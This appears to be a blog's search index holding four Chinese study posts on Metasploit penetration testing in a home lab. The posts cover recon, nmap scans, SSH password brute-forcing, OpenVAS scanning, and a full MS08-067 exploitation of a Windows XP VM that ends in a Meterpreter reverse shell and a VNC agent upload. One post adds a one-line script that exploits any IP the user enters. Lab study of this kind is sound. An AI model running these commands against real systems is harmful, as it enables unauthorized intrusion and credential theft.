<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[[渗透学习]4.情报搜集]]></title>
    <url>%2F2019%2F08%2F04%2F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-4-%E6%83%85%E6%8A%A5%E6%90%9C%E9%9B%86%2F</url>
    <content type="text"><![CDATA[通过情信息搜集工作,确定渗透测试目标范围 通过情报信息搜集,发现渗透目标的安全漏洞与脆弱点,为后续的渗透攻击提供基础 情报搜集技术 1.外围信息搜集 1.1.通过DNS和IP whois 1234567891011121314151617181920212223242526$ whois sina.com Domain Name: SINA.COM Registry Domain ID: 2243615_DOMAIN_COM-VRSN Registrar WHOIS Server: whois.paycenter.com.cn Registrar URL: http://www.xinnet.com Updated Date: 2018-12-20T09:17:25Z Creation Date: 1998-09-16T04:00:00Z Registry Expiry Date: 2021-09-15T04:00:00Z Registrar: Xin Net Technology Corporation Registrar IANA ID: 120 Registrar Abuse Contact Email: supervision@xinnet.com Registrar Abuse Contact Phone: +86.1087127926 Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited Name Server: NS1.SINA.COM Name Server: NS1.SINA.COM.CN Name Server: NS2.SINA.COM Name Server: NS2.SINA.COM.CN Name Server: NS3.SINA.COM Name Server: NS3.SINA.COM.CN Name Server: NS4.SINA.COM DNSSEC: unsigned URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/&gt;&gt;&gt; Last update of whois database: 2019-08-04T07:30:28Z &lt;&lt;&lt;... nslookup 12345678910$ nslookup&gt; set type=A&gt; sina.comServer: 10.10.10.2Address: 10.10.10.2#53Non-authoritative answer:Name: sina.comAddress: 111.0.93.239&gt; exit dig 123456789101112131415161718192021$ dig @8.8.8.8 sina.com; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; @8.8.8.8 sina.com; (1 server found);; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 19416;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;sina.com. IN A;; ANSWER SECTION:sina.com. 600 IN A 111.0.93.239;; Query time: 12 msec;; SERVER: 8.8.8.8#53(8.8.8.8);; WHEN: 日 8月 04 15:36:01 CST 2019;; MSG SIZE rcvd: 53 IP地理位置查询 1.站长之家 2.GeoIP2 netcraft信息查询服务 netcraft 反查域名 站长之家同IP网站查询 1.2.搜索引擎 Google Hacking(GHDB) SiteDigger Search Diggity ghh(http://ghh.sourceforge.net/) 2.主机探测与端口扫描 2.1.寻找活跃主机 ping Metasploit的主机发现模块 1234567891011121314msf5 &gt; search scanner/discoveryMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/discovery/arp_sweep normal Yes ARP Sweep Local Network Discovery 1 auxiliary/scanner/discovery/empty_udp normal Yes UDP Empty Prober 2 auxiliary/scanner/discovery/ipv6_multicast_ping normal No IPv6 Link Local/Node Local Ping Discovery 3 auxiliary/scanner/discovery/ipv6_neighbor normal Yes IPv6 Local Neighbor Discovery 4 auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement normal No IPv6 Local Neighbor Discovery Using Router Advertisement 5 auxiliary/scanner/discovery/udp_probe normal Yes UDP Service Prober 6 auxiliary/scanner/discovery/udp_sweep normal Yes UDP Service Sweeper nmap 2.2.操作系统识别 123456789101112131415161718192021222324252627282930msf5 &gt; nmap -O 10.10.10.130[*] exec: nmap -O 10.10.10.130Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-04 15:59 CSTNmap scan report for service.dvssc.com (10.10.10.130)Host is up (0.00078s latency).Not shown: 985 closed portsPORT STATE SERVICE21/tcp open ftp80/tcp open http135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds777/tcp open multiling-http1025/tcp open NFS-or-IIS1026/tcp open LSA-or-nterm1027/tcp open IIS1031/tcp open iad21521/tcp open oracle6002/tcp open X11:27001/tcp open afs3-callback7002/tcp open afs3-prserver8099/tcp open unknownMAC Address: 00:0C:29:68:2B:56 (VMware)Device type: general purposeRunning: Microsoft Windows XP|2003OS CPE: cpe:/o:microsoft:windows_xp::sp2:professional cpe:/o:microsoft:windows_server_2003OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003Network Distance: 1 hop... 2.3.端口扫描 Metasploit中的端口扫描器 123456789101112131415 msf5 &gt; search portscan Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/wordpress_pingback_access normal Yes Wordpress Pingback Locator 1 auxiliary/scanner/natpmp/natpmp_portscan normal Yes NAT-PMP External Port Scanner 2 auxiliary/scanner/portscan/ack normal Yes TCP ACK Firewall Scanner 3 auxiliary/scanner/portscan/ftpbounce normal Yes FTP Bounce Port Scanner 4 auxiliary/scanner/portscan/syn normal Yes TCP SYN Port Scanner 5 auxiliary/scanner/portscan/tcp normal Yes TCP Port Scanner 6 auxiliary/scanner/portscan/xmas normal Yes TCP &quot;XMas&quot; Port Scanner 7 auxiliary/scanner/sap/sap_router_portscanner normal No SAPRouter Port Scanner nmap 2.4.探测结果分析 结果分析 3.服务扫描与查点 3.1网络服务扫描 Telnet扫描 辅助模块:auxiliary/scanner/telnet/telnet_version SSH扫描 辅助模块:auxiliary/scanner/ssh/ssh_version Oracle数据库服务查点 辅助模块:auxiliary/scanner/oracle/tnslsnr_version 代理 辅助模块:auxiliary/scanner/http/open_proxy 3.2口令猜测与嗅探 SSH服务口令猜测 1234567891011121314151617181920212223242526272829303132333435363738msf5 &gt; use auxiliary/scanner/ssh/ssh_loginmsf5 auxiliary(scanner/ssh/ssh_login) &gt; show optionsModule options (auxiliary/scanner/ssh/ssh_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD ubnutu no A specific password to authenticate with PASS_FILE /root/ubuntu.txt no File containing passwords, one per line RHOSTS 10.10.10.254 yes The target address range or CIDR identifier RPORT 22 yes The target port STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host THREADS 50 yes The number of concurrent threads USERNAME root no A specific username to authenticate as USERPASS_FILE no File containing users and passwords separated by space, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE no File containing usernames, one per line VERBOSE false yes Whether to print output for all attemptsmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.254RHOSTS =&gt; 10.10.10.254msf5 auxiliary(scanner/ssh/ssh_login) &gt; set USERNAME rootUSERNAME =&gt; rootmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /root/ubuntu.txtPASS_FILE =&gt; /root/ubuntu.txtmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set THREADS 50THREADS =&gt; 50msf5 auxiliary(scanner/ssh/ssh_login) &gt; run[+] 10.10.10.254:22 - Success: &apos;root:ubuntu&apos; &apos;&apos;[*] Command shell session 2 opened (10.10.10.128:42761 -&gt; 10.10.10.254:22) at 2019-08-04 16:25:54 +0800[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 2.psnuffle口令嗅探 辅助模块:auxiliary/sniffer/psnuffle 4.网络漏洞扫描 4.1.安装OpenVAS 安装教程 注意:openvas-check-setup可能会报错 解决方法:按照提示 FIX: Run a CERT synchronization script like openvas-certdata-sync or greenbone-certdata-sync. (特别是加粗的这个脚本.我安装时只提醒我要运行后一个脚本,但运行后仍无效,运行加粗的脚本之后问题解决) 4.2.在Msfconsole中使用OpenVAS 载入openvas 12345678msf5 &gt; load openvas[*] Welcome to OpenVAS integration by kost and averagesecurityguy.[*] [*] OpenVAS integration requires a database connection. Once the [*] database is ready, connect to the OpenVAS server using openvas_connect.[*] For additional commands use openvas_help.[*] [*] Successfully loaded plugin: OpenVAS 连接到OpenVAS的管理引擎 123msf5 &gt; openvas_connect admin 你自己设置的密码127.0.0.1 9390 ok[*] Connecting to OpenVAS instance at 127.0.0.1:9390 with username admin...[+] OpenVAS connection successful 创建扫描目标 12345678msf5 &gt; openvas_target_create test 10.10.10.254 Metasploitable[*] 5692f7b4-4527-4315-97ea-4ba84a4773c3[+] OpenVAS list of targetsID Name Hosts Max Hosts In Use Comment-- ---- ----- --------- ------ --- ----54f9d83b-17fa-4816-afe8-648172143699 ubuntu1 10.10.10.254 1 1 Metasploitable5692f7b4-4527-4315-97ea-4ba84a4773c3 test 10.10.10.254 1 0 Metasploitable 创建扫描任务 1234567891011121314151617181920212223242526272829303132333435msf5 &gt; openvas_task_create -help[*] Usage: openvas_task_create &lt;name&gt; &lt;comment&gt; &lt;config_id&gt; &lt;target_id&gt;msf5 &gt; openvas_config_list[+] OpenVAS list of configsID Name-- ----085569ce-73ed-11df-83c3-002264764cea empty2d3f051c-55ba-11e3-bf43-406186ea4fc5 Host Discovery698f691e-7489-11df-9d8c-002264764cea Full and fast ultimate708f25c4-7489-11df-8094-002264764cea Full and very deep74db13d6-7489-11df-91b9-002264764cea Full and very deep ultimate8715c877-47a0-438d-98a3-27c7a6ab2196 Discoverybbca7412-a950-11e3-9109-406186ea4fc5 System Discoverydaba56c8-73ec-11df-a475-002264764cea Full and fastmsf5 &gt; openvas_targets_list[-] Unknown command: openvas_targets_list.msf5 &gt; openvas_target_list[+] OpenVAS list of targetsID Name Hosts Max Hosts In Use Comment-- ---- ----- --------- ------ ---- ---54f9d83b-17fa-4816-afe8-648172143699 ubuntu1 10.10.10.254 1 1 Metasploitable5692f7b4-4527-4315-97ea-4ba84a4773c3 test 10.10.10.254 1 0 Metasploitablemsf5 &gt; openvas_task_create test1 &quot;Scan test&quot; daba56c8-73ec-11df-a475-002264764cea 5692f7b4-4527-4315-97ea- 4ba84a4773c3[*] df87292f-9c36-44e0-bb11-fccebc9b6c07[+] OpenVAS list of tasksID Name Comment Status Progress-- ---- ------- ------ --------2659ed72-abab-4c8f-bc15-851c28a718b4 Ubuntu Scan of Ubuntu Metasploitable Done -1df87292f-9c36-44e0-bb11-fccebc9b6c07 test1 Scan test New -1 启动扫描任务 123456789 msf5 &gt; openvas_task_start df87292f-9c36-44e0-bb11-fccebc9b6c07 [*] &lt;X&gt;&lt;authenticate_response status=&apos;200&apos; status_text=&apos;OK&apos;&gt;&lt;role&gt;Admin&lt;/role&gt;&lt;timezone&gt;UTC&lt;/timezone&gt; &lt;severity&gt;nist&lt;/severity&gt;&lt;/authenticate_response&gt;&lt;start_task_response status=&apos;202&apos; status_text=&apos;OK, request submitted&apos;&gt;&lt;report_id&gt;458f32be-7855-4dfc-9968-fb80ad52ee4f&lt;/report_id&gt;&lt;/start_task_response&gt;&lt;/X&gt;msf5 &gt; openvas_task_list[+] OpenVAS list of tasks ID Name Comment Status Progress -- ---- ------- - ----- -------- 2659ed72-abab-4c8f-bc15-851c28a718b4 Ubuntu Scan of Ubuntu Metasploitable Done -1 df87292f-9c36-44e0-bb11-fccebc9b6c07 test1 Scan test Running 1 等待任务完成 下载扫描报告 1msf5 &gt; openvas_report_list 可以在127.0.0.1:9392 查看相关信息 5.渗透测试信息数据库与共享 5.1建立PostgreSQL数据库 启动postgresql服务 1234567# root @ K in ~ [14:46:56] C:1$ service postgresql startP# root @ K in ~ [14:57:50] $ netstat -tnpl | grep postgrestcp 0 0 127.0.0.1:5432 0.0.0.0:* LISTEN 51073/postgres tcp6 0 0 ::1:5432 :::* LISTEN 51073/postgres 创建用户 123postgres@K:/root$ createuser -P admin为新角色输入的口令: 再输入一遍: 创建数据库 1postgres@K:/root$ createdb --owner=admin metasploit1 连接数据库 123456msf5 &gt; db_connect admin:你自己设置的密码@localhost:5432/metasploit1[-] Connection already established. Only one connection is allowed at a time.[-] Run db_disconnect first if you wish to connect to a different data service.Current connection information:[*] Connected to msf. Connection type: postgresql. 5.2PostgreSQL的作用 1.导入多种扫描器的结果 ** 例1:将nmap结果导入数据库 ** 1234567891011121314msf5 &gt; nmap -Pn -sV -oX dmz 10.10.10.0/24...Nmap done: 256 IP addresses (6 hosts up) scanned in 182.65 secondsmsf5 &gt; db_import /root/dmz[*] Importing &apos;Nmap XML&apos; data[*] Import: Parsing with &apos;Nokogiri v1.10.3&apos;[*] Importing host 10.10.10.1[*] Importing host 10.10.10.2[*] Importing host 10.10.10.129[*] Importing host 10.10.10.130[*] Importing host 10.10.10.254[*] Importing host 10.10.10.128[*] Successfully imported /root/dmz ** 例2.将OpenVAS结果导入数据库 ** 连接数据库和openvas 1234567891011121314151617 msf5 &gt; db_connect admin:你自己设置的密码@localhost:5432/metasploit1 [-] Connection already established. Only one connection is allowed at a time. [-] Run db_disconnect first if you wish to connect to a different data service. Current connection information:[*] Connected to msf. Connection type: postgresql.msf5 &gt; load openvas[*] Welcome to OpenVAS integration by kost and averagesecurityguy.[*] [*] OpenVAS integration requires a database connection. Once the [*] database is ready, connect to the OpenVAS server using openvas_connect.[*] For additional commands use openvas_help.[*] [*] Successfully loaded plugin: OpenVASmsf5 &gt; openvas_connect admin 你自己设置的密码 127.0.0.1 9390 ok[*] Connecting to OpenVAS instance at 127.0.0.1:9390 with username admin...[+] OpenVAS connection successful 查询报告ID和格式ID 12345678910111213141516171819202122232425262728 msf5 &gt; openvas_report_list [+] OpenVAS list of reports ID Task Name Start Time Stop Time -- --------- ---------- --------- 458f32be-7855-4dfc-9968-fb80ad52ee4f test1 2019-08-04T08:46:59Z 2019-08-04T09:08:00Z d5f9066b-587f-4e0c-b5dc-6bcb4d96dd5a Ubuntu 2019-08-02T12:24:24Z 2019-08-02T12:45:26Z msf5 &gt; openvas_format_list [+] OpenVAS list of report formatsID Name Extension Summary-- ---- --------- -------5057e5cc-b825-11e4-9d0e-28d24461215b Anonymous XML xml Anonymous version of the raw XML report50c9950a-f326-11e4-800c-28d24461215b Verinice ITG vna Greenbone Verinice ITG Report, v1.0.1.5ceff8ba-1f62-11e1-ab9f-406186ea4fc5 CPE csv Common Product Enumeration CSV table.6c248850-1f62-11e1-b082-406186ea4fc5 HTML html Single page HTML report.77bd6c4a-1f62-11e1-abf0-406186ea4fc5 ITG csv German &quot;IT-Grundschutz-Kataloge&quot; report.9087b18c-626c-11e3-8892-406186ea4fc5 CSV Hosts csv CSV host summary.910200ca-dc05-11e1-954f-406186ea4fc5 ARF xml Asset Reporting Format v1.0.0.9ca6fe72-1f62-11e1-9e7c-406186ea4fc5 NBE nbe Legacy OpenVAS report.9e5e5deb-879e-4ecc-8be6-a71cd0875cdd Topology SVG svg Network topology SVG image.a3810a62-1f62-11e1-9219-406186ea4fc5 TXT txt Plain text report.a684c02c-b531-11e1-bdc2-406186ea4fc5 LaTeX tex LaTeX source file.a994b278-1f62-11e1-96ac-406186ea4fc5 XML xml Raw XML report.c15ad349-bd8d-457a-880a-c7056532ee15 Verinice ISM vna Greenbone Verinice ISM Report, v3.0.0.c1645568-627a-11e3-a660-406186ea4fc5 CSV Results csv CSV result list.c402cc3e-b531-11e1-9163-406186ea4fc5 PDF pdf Portable Document Format report. 导出 12msf5 &gt; openvas_report_import d5f9066b-587f-4e0c-b5dc-6bcb4d96dd5a 9ca6fe72-1f62-11e1-9e7c-406186ea4fc5[*] Importing report to database. 查看导入的漏洞信息 123456789 msf5 &gt; vulns Vulnerabilities =============== Timestamp Host Name References --------- ---- ---- ----------2019-07-29 04:45:07 UTC 192.168.81.135 Samba &quot;username map script&quot; Command Execution CVE-2007-2447,OSVDB-34700,BID-23972,URL-http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534,URL-http://samba.org/samba/security/CVE-2007-2447.html... 2.共享数据库 2.1.网络数据库共享 修改postgresql.conf 123456# root @ K in ~ [16:48:43] $ find / -name postgresql.conf/etc/postgresql/11/main/postgresql.conf/usr/lib/tmpfiles.d/postgresql.conf# root @ K in ~ [16:44:21] $ vim /etc/postgresql/11/main/postgresql.conf 将#listen_addresses=&quot;localhost&quot;一行改为 listen_addresses=&quot;*&quot; 修改pg_hba.conf 12# root @ K in ~ [16:45:14] $ vim /etc/postgresql/11/main/pg_hba.conf 在IPv4 local connections一行加入 host all all 10.10.10.1/24 md5 此处的10.10.10.1/24是虚拟机的本地局域网 重启查看 1234567# root @ K in ~ [16:48:36] $ service postgresql restart # root @ K in ~ [16:48:40] $ netstat -tnpl | grep &quot;postgres&quot; tcp 0 0 0.0.0.0:5432 0.0.0.0:* LISTEN 2891/postgres tcp6 0 0 :::5432 :::* LISTEN 2891/postgres 测试 123 msf5 &gt; db_connect admin:你自己设置的密码@10.10.10.128:5432/metasploit1 msf5 &gt; db_status[*] Connected to metasploit1. Connection type: postgresql. Connection name: XD3pnzoq. 2.2.Metasploit RPC服务共享 开启服务 12345 # root @ K in ~ [17:32:48] $ msfrpcd -P 你自己设置的密码 -U admin -a 0.0.0.0[*] MSGRPC starting on 0.0.0.0:55553 (SSL):Msg...[*] MSGRPC backgrounding at 2019-08-05 17:33:43 +0800...[*] MSGRPC background PID 3301 另一台同版本的计算机上连接 1234567# root @ K in ~ [17:47:14] C:127$ msfdb init [i] Database already started[i] The database appears to be already configured, skipping initialization# root @ K in ~ [17:48:00] $ armitage]]></content>
  </entry>
  <entry>
    <title><![CDATA[[渗透学习]3.渗透测试实验环境]]></title>
    <url>%2F2019%2F08%2F04%2F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-3-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[为之后的实验做准备 搭建实验环境 所需的虚拟机(百度网盘链接) 配置要求(按魔鬼训练营书上的要求配置,部分配置已经配置完毕.详见参考资料) 参考资料]]></content>
  </entry>
  <entry>
    <title><![CDATA[[渗透学习]2.对Winxp的渗透攻击]]></title>
    <url>%2F2019%2F08%2F04%2F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-2-%E5%AF%B9Winxp%E7%9A%84%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[初次对Win XP的渗透 ** 基本信息:** Kali: IP:10.10.10.128 Win Xp Home Edition (未开启防火墙) 两者都为虚拟机 渗透过程 1.Nmap扫描本地网络 123456789101112131415msf5 &gt; nmap -sP 10.10.10.0/24[*] exec: nmap -sP 10.10.10.0/24Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-04 13:55 CSTNmap scan report for 10.10.10.1Host is up (0.00018s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 10.10.10.2Host is up (0.00013s latency).MAC Address: 00:50:56:E0:25:15 (VMware)Nmap scan report for 10.10.10.131Host is up (0.00027s latency).MAC Address: 00:0C:29:85:CA:88 (VMware)...Nmap done: 256 IP addresses (5 hosts up) scanned in 4.13 seconds 其中10.10.10.131为渗透目标 2.搜集目标信息 2.1获取目标的操作系统信息 12345678910111213141516171819[*] exec: nmap -O 10.10.10.131Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-04 13:58 CSTNmap scan report for 10.10.10.131Host is up (0.00055s latency).Not shown: 997 closed portsPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-dsMAC Address: 00:0C:29:85:CA:88 (VMware)Device type: general purposeRunning: Microsoft Windows XP|2003OS CPE: cpe:/o:microsoft:windows_xp::sp2:professional cpe:/o:microsoft:windows_server_2003OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003Network Distance: 1 hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 4.63 seconds 扫描结果也可能有不正确的地方 但我们能从中得知OS为Win XP SP2 因为我安装的Win XP没更新也没开启防火墙所以可以利用MS08-067发起攻击 3.利用Metasploit的渗透攻击模块进行攻击 3.1.搜寻并加载模块 12345678910111213141516171819202122232425msf5 &gt; search ms08-067Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms08_067_netapi 2008-10-28 great Yes MS08-067 Microsoft Server Service Relative Path Stack Corruptionmsf5 &gt; use exploit/windows/smb/ms08_067_netapimsf5 exploit(windows/smb/ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier RPORT 445 yes The SMB service port (TCP) SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)Exploit target: Id Name -- ---- 0 Automatic Targeting 3.2.设置必要的信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899msf5 exploit(windows/smb/ms08_067_netapi) &gt; set RHOSTS 10.10.10.131RHOSTS =&gt; 10.10.10.131msf5 exploit(windows/smb/ms08_067_netapi) &gt; show targetsExploit targets: Id Name -- ---- 0 Automatic Targeting 1 Windows 2000 Universal 2 Windows XP SP0/SP1 Universal 3 Windows 2003 SP0 Universal 4 Windows XP SP2 English (AlwaysOn NX) 5 Windows XP SP2 English (NX) 6 Windows XP SP3 English (AlwaysOn NX) 7 Windows XP SP3 English (NX) 8 Windows XP SP2 Arabic (NX) 9 Windows XP SP2 Chinese - Traditional / Taiwan (NX) 10 Windows XP SP2 Chinese - Simplified (NX) 11 Windows XP SP2 Chinese - Traditional (NX) 12 Windows XP SP2 Czech (NX) 13 Windows XP SP2 Danish (NX) 14 Windows XP SP2 German (NX) 15 Windows XP SP2 Greek (NX) 16 Windows XP SP2 Spanish (NX) 17 Windows XP SP2 Finnish (NX) 18 Windows XP SP2 French (NX) 19 Windows XP SP2 Hebrew (NX) 20 Windows XP SP2 Hungarian (NX) 21 Windows XP SP2 Italian (NX) 22 Windows XP SP2 Japanese (NX) 23 Windows XP SP2 Korean (NX) 24 Windows XP SP2 Dutch (NX) 25 Windows XP SP2 Norwegian (NX) 26 Windows XP SP2 Polish (NX) 27 Windows XP SP2 Portuguese - Brazilian (NX) 28 Windows XP SP2 Portuguese (NX) 29 Windows XP SP2 Russian (NX) 30 Windows XP SP2 Swedish (NX) 31 Windows XP SP2 Turkish (NX) 32 Windows XP SP3 Arabic (NX) 33 Windows XP SP3 Chinese - Traditional / Taiwan (NX) 34 Windows XP SP3 Chinese - Simplified (NX) 35 Windows XP SP3 Chinese - Traditional (NX) 36 Windows XP SP3 Czech (NX) 37 Windows XP SP3 Danish (NX) 38 Windows XP SP3 German (NX) 39 Windows XP SP3 Greek (NX) 40 Windows XP SP3 Spanish (NX) 41 Windows XP SP3 Finnish (NX) 42 Windows XP SP3 French (NX) 43 Windows XP SP3 Hebrew (NX) 44 Windows XP SP3 Hungarian (NX) 45 Windows XP SP3 Italian (NX) 46 Windows XP SP3 Japanese (NX) 47 Windows XP SP3 Korean (NX) 48 Windows XP SP3 Dutch (NX) 49 Windows XP SP3 Norwegian (NX) 50 Windows XP SP3 Polish (NX) 51 Windows XP SP3 Portuguese - Brazilian (NX) 52 Windows XP SP3 Portuguese (NX) 53 Windows XP SP3 Russian (NX) 54 Windows XP SP3 Swedish (NX) 55 Windows XP SP3 Turkish (NX) 56 Windows 2003 SP1 English (NO NX) 57 Windows 2003 SP1 English (NX) 58 Windows 2003 SP1 Japanese (NO NX) 59 Windows 2003 SP1 Spanish (NO NX) 60 Windows 2003 SP1 Spanish (NX) 61 Windows 2003 SP1 French (NO NX) 62 Windows 2003 SP1 French (NX) 63 Windows 2003 SP2 English (NO NX) 64 Windows 2003 SP2 English (NX) 65 Windows 2003 SP2 German (NO NX) 66 Windows 2003 SP2 German (NX) 67 Windows 2003 SP2 Portuguese - Brazilian (NX) 68 Windows 2003 SP2 Spanish (NO NX) 69 Windows 2003 SP2 Spanish (NX) 70 Windows 2003 SP2 Japanese (NO NX) 71 Windows 2003 SP2 French (NO NX) 72 Windows 2003 SP2 French (NX)msf5 exploit(windows/smb/ms08_067_netapi) &gt; set target 10target =&gt; 10msf5 exploit(windows/smb/ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.10.10.131 yes The target address range or CIDR identifier RPORT 445 yes The SMB service port (TCP) SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)Exploit target: Id Name -- ---- 10 Windows XP SP2 Chinese - Simplified (NX) 3.3.发起攻击 1234567msf5 exploit(windows/smb/ms08_067_netapi) &gt; exploit[*] Started reverse TCP handler on 10.10.10.128:4444 [*] 10.10.10.131:445 - Attempting to trigger the vulnerability...[*] Sending stage (179779 bytes) to 10.10.10.131[*] Meterpreter session 1 opened (10.10.10.128:4444 -&gt; 10.10.10.131:1046) at 2019-08-04 14:23:41 +0800 3.4.攻击载荷模块 1234567891011121314151617181920212223242526272829meterpreter &gt; ipconfigInterface 1============Name : MS TCP Loopback interfaceHardware MAC : 00:00:00:00:00:00MTU : 1520IPv4 Address : 127.0.0.1Interface 2============Name : AMD PCNET Family PCI Ethernet Adapter - rfaceHardware MAC : 00:0c:29:85:ca:88MTU : 1500IPv4 Address : 10.10.10.131IPv4 Netmask : 255.255.255.0Interface 65540============Name : Bluetooth @�Hardware MAC : c8:21:58:95:b0:86MTU : 1500meterpreter &gt; run vnc[*] Creating a VNC reverse tcp stager: LHOST=10.10.10.128 LPORT=4545[*] Running payload handler[*] VNC stager executable 73802 bytes long[*] Uploaded the VNC agent to C:\WINDOWS\TEMP\jOcidjq.exe (must be deleted manually)[*] Executing the VNC agent with endpoint 10.10.10.128:4545...]]></content>
      <categories>
        <category>渗透学习</category>
      </categories>
      <tags>
        <tag>实战演习</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[渗透学习]1.了解渗透测试]]></title>
    <url>%2F2019%2F08%2F03%2F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-1-%E4%BA%86%E8%A7%A3%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[渗透和Metasploit的基本知识 一.初识渗透 1.渗透基本知识 1.1.渗透分类 黑盒测试 白盒测试 灰盒测试 1.2.渗透测试方法 OSSTMM NIST OWASP WASC-TC PTES 1.3.渗透测试过程 前期交互阶段 情报搜集阶段 威胁建模阶段 漏洞分析阶段 渗透攻击阶段 后渗透攻击阶段 2.漏洞基本知识 2.1.漏洞生命周期 2.2.漏洞披露方式 完全公开披露 负责任的公开披露 地下经济链 小范围利用直至被披露 2.3.漏洞公共资源库 Exploit-db VULHUB 3.Metasploit 包括了: 辅助模块 渗透攻击模块 攻击载荷模块 空指令模块 编码器模块 3.1.安装Metasploit Kali自带Metasploit msfgui msfconsole msfcli(命令行程序) 用msfconsole -x代替 示例: 123456789echo &quot;请输入目标IP&quot;read ipmsfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi;set RHOST $ip;set target 10;exploit&quot; 参考书籍:Metasploit渗透测试魔鬼训练营]]></content>
      <categories>
        <category>渗透学习</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>学习</tag>
      </tags>
  </entry>
</search>
